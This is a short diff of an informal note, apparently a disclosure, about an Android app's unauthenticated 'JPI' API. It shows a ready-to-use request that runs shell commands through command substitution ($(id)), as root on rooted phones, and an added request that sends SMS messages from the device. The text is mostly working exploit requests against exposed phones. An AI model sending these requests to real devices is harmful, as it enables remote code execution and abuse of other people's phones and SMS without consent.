@@ -9,3 +9,7 @@ but anyway there's an api that does need any auth and you can exec scripts or co
 can be run as root if the phone is rooted 
 
 IP:port/JPI/?action=shell&script=%24(id)&statusOnly=0&root=1
+
+you can do most of stuff with the api like send a message 
+
+IP:port/JPI/?action=sendSms&number=NUMBER&message=test
